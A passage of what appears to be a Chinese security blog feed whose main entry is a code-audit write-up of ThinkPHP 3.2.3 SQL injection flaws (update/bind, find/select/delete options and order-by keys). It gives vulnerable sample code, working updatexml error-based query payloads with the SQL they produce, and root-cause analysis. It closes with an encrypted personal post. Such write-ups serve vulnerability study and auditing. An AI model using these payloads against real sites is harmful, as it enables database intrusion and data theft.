class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;thinkphp&#x2F;LICENSE.txt</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;thinkphp&#x2F;logo.png</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;thinkphp&#x2F;composer.json</span></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      phpthink杂七杂八笔记
    
    </summary>
    
    
      <category term="Notes" scheme="http://h3art3ars.github.io/categories/Notes/"/>
    
    
      <category term="Notes" scheme="http://h3art3ars.github.io/tags/Notes/"/>
    
      <category term="thinkphp" scheme="http://h3art3ars.github.io/tags/thinkphp/"/>
    
  </entry>
  
  <entry>
    <title>think3.2.3 sql注入</title>
    <link href="http://h3art3ars.github.io/2019/12/23/think3-2-3-sql%E6%B3%A8%E5%85%A5/"/>
    <id>http://h3art3ars.github.io/2019/12/23/think3-2-3-sql%E6%B3%A8%E5%85%A5/</id>
    <published>2019-12-23T04:16:44.000Z</published>
    <updated>2019-12-23T04:21:41.980Z</updated>
    
    <content type="html"><![CDATA[<h2 id="update注入-lt-3-2-3"><a href="#update注入-lt-3-2-3" class="headerlink" title="update注入(&lt;=3.2.3)"></a>update注入(&lt;=3.2.3)</h2><h3 id="漏洞代码实例"><a href="#漏洞代码实例" class="headerlink" title="漏洞代码实例"></a>漏洞代码实例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">$User&#x3D;M(&#39;user&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$user[&#39;id&#39;]&#x3D;I(&#39;id&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$data[&#39;name&#39;]&#x3D;I(&#39;name&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">$data[&#39;money&#39;]&#x3D;I(&#39;money&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">$res&#x3D;$User-&gt;where($user)-&gt;save($data);</span></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">?id[]&#x3D;bind&amp;id[1]&#x3D;1%20and%20%20updatexml(1,concat(0x5b,(select%20user()),0x5d),1)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;UPDATE &#96;user&#96; SET &#96;money&#96;&#x3D;&#39;0&#39;,&#96;user&#96;&#x3D;&#39;&#39; WHERE &#96;id&#96; &#x3D; &#39;&#39; and updatexml(1,concat(0x5b,(select user()),0x5d),1)</span></pre></td></tr></table></figure><h3 id="漏洞流程"><a href="#漏洞流程" class="headerlink" title="漏洞流程"></a>漏洞流程</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">save($data,$options)-&gt;_parseOptions($Options)-&gt;update($data,$options)-&gt;parsewhere($option[$where])-&gt;parsewhereitem($key,$value)</span></pre></td></tr></table></figure><ul><li><p>$Options参数为空，但经过_parseOptions($Options)方法将参数中的id[]数组变为$where</p></li><li><p>进入parsewhereitem()方法将id分为键值 如果id[0]==bind，则将id[1]拼接到</p></li><li><p>如果id[0]==bind，则将id[1]拼接到 <code>$whereStr .= $key.&#39; = :&#39;.$val[1];</code></p></li><li><p><code>:n</code>表示更新的数组 <code>data[n]</code>,可以结合sql语句闭合一下，有时不闭合也可以造成注入</p></li><li><p>前面的exp变为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">?id[]&#x3D;bind&amp;id[1]&#x3D;1%20and%20%20updatexml(1,concat(0x5b,(select%20user()),0x5d),1)&amp;user&#x3D;admin&amp;money&#x3D;11</span></pre></td></tr></table></figure><p>则语句则变成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">UPDATE &#96;user&#96; SET &#96;money&#96;&#x3D;11,&#96;user&#96;&#x3D;&#39;admin&#39; WHERE &#96;id&#96; &#x3D; 11 and updatexml(1,concat(0x5b,(select user()),0x5d),1)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;id&#x3D;:1 and updat.... </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;而 :1&#x3D;data[1]&#x3D;money&#x3D;11</span></pre></td></tr></table></figure></li></ul><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>经过<code>_parseOptions($Options)</code>方法将可控变量合并到<code>$Options</code>参数中</p><h2 id="find-select-delete注入-lt-3-2-3"><a href="#find-select-delete注入-lt-3-2-3" class="headerlink" title="find_select_delete注入(&lt;=3.2.3)"></a>find_select_delete注入(&lt;=3.2.3)</h2><h3 id="漏洞代码实例-1"><a href="#漏洞代码实例-1" class="headerlink" title="漏洞代码实例"></a>漏洞代码实例</h3><ul><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">  $res&#x3D;M(&#39;user&#39;)-&gt;find(I(&#39;id&#39;));      &#x2F;&#x2F;select * from user where id &#x3D;1;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">  $res&#x3D;M(&#39;user&#39;)-&gt;select(I(&#39;id&#39;));</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$res&#x3D;M(&#39;user&#39;)-&gt;delete(I(&#39;id&#39;));</span></pre></td></tr></table></figure></li></ul><ul><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">  delete 方法 第一个参数可外部控制时可注入</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">  select 方法 第一个参数可外部控制时可注入</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">  find 方法 第一个参数可外部控制时可注入</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">  Add 方法 第二个参数可外部控制时可注入</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">  addAll 方法 第二个参数可外部控制时可注入</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">save 方法 第二个参数可外部控制时可注入</span></pre></td></tr></table></figure></li></ul><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">?id[where]&#x3D;1 and updatexml(1,concat(0x7b,(select user()),0x7d),1)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;[find&#x2F;select]select * from user where id&#x3D;1 and updatexml(1,concat(0x7b,(select user()),0x7d),1)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">?id[table]&#x3D;user%20where%20id&#x3D;updatexml(1,concat(0x5b,(select%20user()),0x5d),1)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;[find&#x2F;select]select * from user where id &#x3D;updatexml(1,concat(0x5b,(select%20user()),0x5d),1)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">?id[where]&#x3D;id%3d3%20and%20updatexml(1,concat(0x5b,(select%20user()),0x5d),1)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;[delete]DELETE FROM &#96;tp_member&#96; WHERE id&#x3D;3 and updatexml(1,concat(0x5b,(select user()),0x5d),1)</span></pre></td></tr></table></figure><p>除了where 还可以利用其他方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">where,table,field,join,group,having....</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;根据parseSql函数动态调试</span></pre></td></tr></table></figure><h3 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p><code>_parseOptions()</code>方法执行了数组合并操作，将可控 <code>options</code>参数拼接到即将执行的sql语句参数中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">if(is_array($options))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    $options &#x3D;  array_merge($this-&gt;options,$options);</span></pre></td></tr></table></figure><h3 id="漏洞流程（find）"><a href="#漏洞流程（find）" class="headerlink" title="漏洞流程（find）"></a>漏洞流程（find）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">find($options&#x3D;array())-&gt;select($options&#x3D;array())-&gt;buildSelectSql($options)-&gt;parseSql($sql,$options&#x3D;array());</span></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;parseSql()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;$sql&#x3D;SELECT%DISTINCT% %FIELD% FROM &#x2F;&#x2F;%TABLE%%FORCE%%JOIN%%WHERE%%GROUP%%HAVING%%ORDER%%LIMIT% %UNION%%LOCK%%COMMENT%</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">public function parseSql($sql,$options&#x3D;array())&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">        $sql   &#x3D; str_replace(          array(&#39;%TABLE%&#39;,&#39;%DISTINCT%&#39;,&#39;%FIELD%&#39;,&#39;%JOIN%&#39;,&#39;%WHERE%&#39;,&#39;%GROUP%&#39;,&#39;%HAVING%&#39;,&#39;%ORDER%&#39;,&#39;%LIMIT%&#39;,&#39;%UNION%&#39;,&#39;%LOCK%&#39;,&#39;%COMMENT%&#39;,&#39;%FORCE%&#39;),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">            array(</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseTable($options[&#39;table&#39;]),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseDistinct(isset($options[&#39;distinct&#39;])?$options[&#39;distinct&#39;]:false),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseField(!empty($options[&#39;field&#39;])?$options[&#39;field&#39;]:&#39;*&#39;),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseJoin(!empty($options[&#39;join&#39;])?$options[&#39;join&#39;]:&#39;&#39;),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseWhere(!empty($options[&#39;where&#39;])?$options[&#39;where&#39;]:&#39;&#39;),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseGroup(!empty($options[&#39;group&#39;])?$options[&#39;group&#39;]:&#39;&#39;),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseHaving(!empty($options[&#39;having&#39;])?$options[&#39;having&#39;]:&#39;&#39;),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseOrder(!empty($options[&#39;order&#39;])?$options[&#39;order&#39;]:&#39;&#39;),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseLimit(!empty($options[&#39;limit&#39;])?$options[&#39;limit&#39;]:&#39;&#39;),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseUnion(!empty($options[&#39;union&#39;])?$options[&#39;union&#39;]:&#39;&#39;),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseLock(isset($options[&#39;lock&#39;])?$options[&#39;lock&#39;]:false),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseComment(!empty($options[&#39;comment&#39;])?$options[&#39;comment&#39;]:&#39;&#39;),</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;parseForce(!empty($options[&#39;force&#39;])?$options[&#39;force&#39;]:&#39;&#39;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">            ),$sql);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">        return $sql;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr></table></figure><p>将可控的options[‘where’]参数拼接到sql语句中</p><p>也可以使用其他的options值拼接，例如options[‘table’]</p><p><a href="https://xz.aliyun.com/t/2631" target="_blank" rel="noopener"> thinkphp3.2_find_select_delete注入 </a></p><h2 id="ord-by-注入-lt-3-2-3-amp-lt-5-1-22"><a href="#ord-by-注入-lt-3-2-3-amp-lt-5-1-22" class="headerlink" title="ord by 注入(&lt;=3.2.3&amp;&lt;=5.1.22)"></a>ord by 注入(&lt;=3.2.3&amp;&lt;=5.1.22)</h2><h3 id="漏洞代码实例-2"><a href="#漏洞代码实例-2" class="headerlink" title="漏洞代码实例"></a>漏洞代码实例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">$data&#x3D;array();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$data[&#39;user&#39;]&#x3D;array(&#39;eq&#39;,&#39;admin&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$order&#x3D;I(&#39;get.order&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">$res&#x3D;M(&#39;user&#39;)-&gt;where($data)-&gt;order($order)-&gt;find();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">ar_dump($res);</span></pre></td></tr></table></figure><h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">?order[updatexml(1,concat(0x3a,(select%20user()),0x5d),1)%23]&#x3D;1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;直接用order&#x3D;updatexml(1,concat(0x3a,(select%20user()),0x5d),1)%23也行 亲测</span></pre></td></tr></table></figure><p>执行的sql</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">SELECT * FROM &#96;user&#96; WHERE &#96;user&#96; &#x3D; &#39;admin&#39; ORDER BY updatexml(1,concat(0x3a,(select user()),0x5d),1)# 1 LIMIT 1</span></pre></td></tr></table></figure><h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><p> ThinkPHP在处理order by排序时，当排序参数可控且为关联数组(key-value)时，由于框架未对数组中key值作安全过滤处理，攻击者可利用key构造SQL语句进行注入。</p>]]></content>
    
    <summary type="html">
    
      think系列之 thinkphp3.2.3 sql注入漏洞总结
    
    </summary>
    
    
      <category term="漏洞" scheme="http://h3art3ars.github.io/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="漏洞" scheme="http://h3art3ars.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="thinkphp" scheme="http://h3art3ars.github.io/tags/thinkphp/"/>
    
      <category term="代码审计" scheme="http://h3art3ars.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="sql注入" scheme="http://h3art3ars.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>2019/11 Person Notes</title>
    <link href="http://h3art3ars.github.io/2019/12/17/2019-11-Person-Notes/"/>
    <id>http://h3art3ars.github.io/2019/12/17/2019-11-Person-Notes/</id>
    <published>2019-12-17T02:43:59.000Z</published>
    <updated>2019-12-17T02:45:20.657Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">没什么好看的垃圾个人笔记</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="d59de06ad25b9edcaa18ec538ddf3fe2215c839654af56f34deec268dbacfe0c">0a6b6a6dd17bc5a243a9fba39bb846422b617f2ce4756723dba336c6ac45db89e21edb41fc8bd7947c33434f635bea09e44d1cf875eebc9c7a2b4237c686565f3b5c5d2c247b7c6e93699a766e585adc480a6f656aef2ba4ccf77ca515a84accfae495bb8f9865d438dfc77a85c69c14160a13cae8bfd31fff510abc015141046412c80bf866414d3f49ad497175565bc3294408e581a8a02ca6fd531a30730b8e56d7d079bc69f5054ac0279d31cbbab1e82a97752aa4bfc4c75f26ca85d45005e79e9bb233e93cde64e5c4005ace908b6765d4f39fe4c7dc35c150e5b07b2f92ca672406c75e8679924d33b04dba22183002e7d85e642435690ed3308ae79774b25a5bc6f3ddfbe0aa43f3d1c615c38576a1407767bc0f5d83588268b8ddbdfcbcd699d1f06e407ac45f2c115142e01bbb50a055548774822806f4ef6fffa094b42403de3a944b666c71cb7e3f7787ed38a0531fb4ec5a8cd775e9fe56f6f938eb1eddf9b996b930f4a090ea8c7d0e6dd8ad933079127ab5bf633ad81a3b6d221fe262eef887b8192a22095cc20c0bbe4389bc19acffbb4bf580ed1c46ecb03a3b5f518752ab8c489b053e0b3ec9895663b5c1829165f483e814c07a546f64412e0d9b21f3ee2d5eb1b0d4fad2c872f888770d5ba49c1771432a5c74e34ac3336bf5d3ed70d934ac93bf2f226a49fd7aebb99b6c51a82723b3ccda6710915116ea492cc2d5d401811d033c172575b4ebb2a5dacde184718f2b9c0bc124a9310832c9b4dcf27128100bddee85165e0e43a6e48c089e0907b1c0a0b322cc4c0f966d690cb3ab5017043ead7597a5ae413cc1d0e8d63a0d986b104ab3b0e481f5ab91f4f35fc1d9f47c8d1d3db4acbdba70c561ff314e28bccfec9685e3b81c54535f0ac989092b7460895f6c1c8ec78e2b621490a4eb8bcd234b331d7b0dfd67153a78469302557955f72bbdbd359749311f4369756511296488308c61f3b31518cce23c3ad6e5f32ffb200226b1077047ca4314ba1fe24ddfcd3c66c0a01bedc930854052afdecefe1961fb719d43bc450b01f032d6f925ef0e87c3cc999644eeee94d7d5e2a68fda2537b10ec8c76d916aa825ca172acfa87c37802df21c73bf270ad74d590efddfbf1b91b4f8c17232aec10a57033ee964650c6446499797af9d9e88a19da2bddb6f149099148d61b4ada7efc5027b0f3764e15d06975050c6306f8cca478750e46e460c2a641736f9e429efa455a36924229573410e1902dc1a38472ef44b8f91378c74b623f0464a5222e873eba89054098b1847c431ac84767d1ea56b1f994c64271f4c8ca3253bfdbb319956c4b6d74f7e6de768b011ed74f8e396a06c723e5d82fbb45e20f675fba9d9511ac3a242bcdf64ce5fbdd2ae6adeca9d1e74b1a1af1c07e9e84d9302ce3287c0574fd896f264f76e8c19a252b47f137a3982d65dcb83b81f76b3756cc6e6f312754b36e3fb6e45d5ac028e30c8d3caeaccd7203c842624eb33d7c169762e00cb87935510ea461a1123fb944cb876cb7be96767090391847254f4de7f3cce0a6a765bb3244610573020f86ad621690d8cc53a54c7b3acbd15589c46f96acc18adf1fe1b55195efd73dd8a5cbce8de55078944ce0b941170b607d6286d46da3e6629c7c2074630260edd78ed89b37df95527bc2909039e4b2aebb4233be0ca3455436c453a12d343f2de5ebea2485ac2b198cce674e445ca2af24987216a7aef591bf1d7ffd8d3f571cc2b09002481837e1bfff5b2f5c943a41a6473938777eea5175ce41936bc9fa2635710a56583b5f4eaf872bc8af162592d82e4d73742b83ffc3280ba21480ec52e576dc0ba4decdfa985eceb0ee999c46976a41e106b9d49d60bb192dbd14cde83537a643ef55f4e8e453d918d9b207571e93a9c7ec13bec308dabf0e21ac9fd11838f7209861d1efffb53378eedbe6faf926139b627d804cf5ffdc1c81e094ac92bac972fa57c903fbd918d8e9e9b3cd31eedadec7e9177a91b5d4591151be09ad4ce3c673ef72168ebbb3197eb27eee0d6a1a7965d481a48ae9dbcc85b05ec11f98849c8ba99ef0d0eec3dd7992c88998d020b0d60ac8a21903bf1a4036a73f20aebe41c97ccac5b8536d68bfdd38985cfeebc080f35e97d8b150f7d9ad20d9e4425ea00f3e8bf92a18f3812cba3cf6fddc690903bf657b73aa246f291e53d301f892f49444d3f06fcc30578bdde7bbe27acd226ca6c8a0236512dde9abd1a94b06e17e5d162cf3e26645ca1fa65386f8eb5432fec042bfcb594b15226029f408247f64b147884d7d842ab9502ed9d20b57c021e9eabead7b18f70df239ca9f713c95d031caff12df2b9c448801efd2ccc049112de535536eedeaeb599b42316b3aaf7e644c271a31608c5347dcf4472a52f927d88e67760b686bb79dcf5254271f50f89b0863898f21ed30357c192f5eb9604046c0f5c18ca6b7280bced5c7f0a2b45a0b8324e059d6b43481c9aa98fb07ea8920590e4e08029be6a9a92bccd9f9423fa204b409a52481ba1c23d9fdd8912547ced8ab20e2078f2a15f107546b5e418546e618770f64a200e35099a80af4e58c3d1eafc88a3cd3a91457efb1ef9c347e8d62e5c9e5a71630162f7f802424e35361aca8ec371ca7cb02f9198326db4e82ca3f999ba26986457920d0a9269861e39299628891582334aa935a85b82a4a6b7b1268d626db8aee2135a1323c93fc1f75bf2874751e4daef36710e5efb27075e2e60401890e8469c215e812115bb4f52bd592d9ba6bc8039fef0507f100b1d18517603a2af9e19853fa6b420a939b022f6cbed40c014d358b909eebba9741c40961bc4a170ebf6590345c8d326bb663336681bade69b9af7f128e22332950021b7d06b17ffae594a77160ba3906c16d852ff15649cda339793a2a608b5b48c37e74ee180236a16357343b7157b2de94dcdd7bd4226c9c2f192856cf3d193443881da31fd73a93e17aa37876495aa0273454c3b2d17f95060bd2050b709dd00d321c97f8a1a99b2c02ac99b776bd1a1f9816d17060a5b118c9e489e4bf05749131902cb7da5ffefd9c5ae502c6a75704492a09d3d0152671df221c2b8221eda891b1d85bc460cfd24655f7e55d6ee68e0c6925ba0ecf42dcffcd28e732fcd3349b61d0c3602ec3c5694b7f2e270fc4bfb8f5971f555b6a98c79a0d6f3eef19a7d56d2bfc805d85e93e2e4cc4c28653e157ab714156b02a6630aab5b3938d2da56918a4fa5219381c74a32d3c6250a4a73279b0e847d93ec87e2463bec082e4598886f0a529c04fe30c442013ca22c4825c0ec8f8e7528727ef99f1b7eaebd3fcf88ef480f8913ecce43d2054dc7372ec49d53a6af4ad1c227c96979ab5aa9615d959f42bd9dec4e5ffe73c37368ba80aec28c4ed7aa59c118d631537fb6edacf7e5f99c2e79658fcdddaf4e63e56b24195f56edd813cc6bd1a077a739bd5f5ae643418e536d36763f4cbc8b5af9ad06cec95f981a09e2a5529fa7b4bdbf3d015aefb54bfa5bcee072470ce093ad164618d18b0b5b2969a810cbd0a26483d7e8c6fb75c49856e726d710c7de224fd22c2431515387b9a1861faa74fa0fc8eb1218ae3223982d3443eaaf7a985535280b53b1b7e1c2a8feb2c9761e518aa7c4e5f8b264a1b561b93144fa0ade5b42301f1ee995482a48df3b2c664090e926e4204d6c7c2d1e7f22c805a4142806bd3b204ea284a4584df40a6e850dc403b71cab189b92907f3c8522244520171b4e4cfb93e31d36aff0826775585fd341ba8892a1b7bfe93b002b033c9ae8a0fb61d212a2be62256855aad95a8cd7dd5b5a431e8c4df46acf16d2c21edc5af84c746a785a816f72ed6737c24e157b2111384472668cf9060c4cbed36e9668d42dd0bfbe0e48066e69e4f2fd4cbaa9e77ff34dceaaa845ebb02db89238fd02958f0847270ad201176d46c106e8e937fb0ac963cf8afebb03b710f5802fba9192dae02960615e62c6f3154d53610f1b099a5ee96b0562bbac1d0621361138be9b869bc1443eda9655bece224c630988a1636ad5b0b8639e09e37fabbfbc231c102685e0c1268339a78b8e42164c83643cee90334dafaadbb207f2c725ae8755c0bc041ac188e9b9d5e803994449bfb05d68ed877c153f40030b883471c35e17fca7509dbb09c3a547609b3523ffe432452e930ba23b60bdb429a7940fe3822f4cb94604bf28eaadb03f34bd3f979a0671f5dc6999fa42e94e9b9e674ebccf2062973fe68206bf4bdddf7bdad42d80a6b9f214dbab2c8e3465ef46abffac20f0aa3e21df53d28e6e14c0f0c8836188703d1407e895a69835828a0288cd207a420ed5cf722557e36014e1489fe85b1276f003ac918924e671a5ec46b649775f8308740cca4718a0b1ba0cc3431e79c99dc30e393eef907a89e0402bb5f0d1a7f791943036a21e2b81495b35285b7b1416342923e4b19c8f469a6b155b603f7acbc25ed1e7a5663b4ea34ccc125710c7334a75500c8d2c94e6b80bfc5d5e3011fc94722c5fd72fcad071155e8c2a540bad42621fe6cf1bac1272889cff0f67a1477aa7b35c67502abadfd573ab0fda38305bb61c64cf481bd111065ba84e59171fa0f5dd9ca41b6a377dd207925d093a018fd9a5f4be32e9d086300d9628810d0f244b72ef445609db5a530edccd08340d85952d8e856c7380eb37e9a1762f4452a8d442f24ce4f1e269e792c91bdf5087ab760722d8736a05a6e6f2920b76d73db2c7d171924903a6bfceb2897aea54515688c5d03d73717f6aecc420673acd291db960ab554c97020fd27cb9ea7c72f6c15cefd2f78e90984bdcc82af571fef64f85ddc96507747e6d17211723e84f0cb662bd7001ebe9fe297c35b62fe936da84f51b1e4433b7ab01e270e0dd9c5efc733103c78153292a30fbdba09e6310b98bd6cfd6f7b48d648befafc04a64cfba61f294f38bbf37e3f7448e9464536c277c226926e63c2deefdb6e86c60819fb259a3b5065d6e66fec8ccc1492e8276446e87493f7c6725b745555d9c5660d25a3fee670fc38e1b3473b6763ec50fe6796285569242f0e649dbfa8e49d4e65ae122f926a4f8d6c95d7fa8fbb17dfbf0ae93360361e2de4929274132e607d5938cde0d9eca12bfce30ecf69ad87a5b453b12de8394351c7405b0a99f5c09155e7624b41353b9ffe8385050f1b03af94be93ec0a98796e3d20fbac17c4e87b5c7d624481c84407297f7ab259f0b04b7c5b92c84b22204e7e8b501d42f2fa6b9fe07cd948f347e4c0b497d5b47db45e485dd7f8f8477801742aed2a0385e978807b6e4bd78a4f43167e7708896212ddc94cb32e6874c70c8cd6982988467363d1ae31856bdfbf1499f558280f7b64029af606a4b9ad39ef7dbccf55ae44e3078fa5c79d16ea19b4d4fe9f1232e7e245094c73a2de8a19302f3d11599a528e38ea4ce6683375f8e326bee59b0e03d25165a4ce27cbc7c3c49bfe6bff337d22a05072b6de4484d127886493c9415b62c0807457ce79ed68a1b25dbea39061bbc9b6ac3ef5986b74ccf781539822f7cd81e8a5cfb9d13c19ba51c6c95422fba732110c6b94765960d5e71bd9e6f784ca79923084cdd484e6834a70aab198fc4591f0ab0f3e0074a0da08af4efcc37ed63a4040e4ce2409980c137bb0fdd2680cf8b90efa1d81c956a1d6cfb8bdb195dce11b96df3a5caba6cdf6ea8365cee7a99f8df3bf2b46eee9a411c77ffc264eda7f6e12e1a55fd2d8ac2667b6082f4e3351e4c9bb11af4bc1f77d629bcfd52965c768007704e0d4cf6d2f663c8dbd5c38260ce48acafc9347f7243cf776fa870be2c19948d8ea2aea5c0c9c2479be83277805d3bb093c7031ebe9a585a66d35259e630c62f91e53f1dc304a8bb8c529c6a3407038d8221a06e4b375c7465ac594aeac4447d2b6a75b4af0552bc1e